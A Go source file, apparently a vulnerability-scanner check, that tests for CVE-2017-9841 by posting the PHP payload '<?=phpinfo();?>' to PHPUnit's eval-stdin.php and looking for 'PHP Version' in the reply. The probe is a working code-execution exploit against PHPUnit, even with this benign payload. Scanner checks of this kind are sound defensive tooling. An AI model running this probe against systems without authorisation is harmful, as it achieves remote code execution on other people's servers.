package phpunit

import (
	"github.com/yhy0/ChYing/pkg/Jie/pkg/protocols/httpx"
	"strings"
)

func CVE_2017_9841(url string, client *httpx.Client) bool {
	if req, err := client.Request(url+"/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "POST", "<?=phpinfo();?>", nil, "Poc PHPUnit"); err == nil {
		if req.StatusCode == 200 && strings.Contains(req.Body, "PHP Version") {
			return true
		}
	}
	return false
}
